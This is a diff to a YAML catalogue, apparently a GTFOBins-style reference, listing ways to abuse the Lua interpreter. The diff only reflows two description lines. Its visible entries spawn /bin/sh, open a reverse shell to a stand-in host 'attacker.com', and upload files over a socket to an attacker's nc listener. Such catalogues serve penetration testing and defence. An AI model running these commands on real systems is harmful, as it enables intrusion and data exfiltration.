@@ -3,8 +3,7 @@ functions:
   execute-interactive:
     - code: lua -e 'os.execute("/bin/sh")'
   reverse-shell-non-interactive:
-    - description: Run <code>nc -l -p 12345</code> on
-        the attacker box to receive the shell. This requires `lua-socket` installed.
+    - description: Run <code>nc -l -p 12345</code> on the attacker box to receive the shell. This requires `lua-socket` installed.
       code: |
         export RHOST=attacker.com
         export RPORT=12345
@@ -28,8 +27,7 @@ functions:
             local b=assert(f:read("*a"));c:send(b);
           end;c:close();f:close();'
   upload:
-    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"`
-        on the attacker box to collect the file. This requires `lua-socket` installed.
+    - description: Send a file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
       code: |
         RHOST=attacker.com
         RPORT=12345
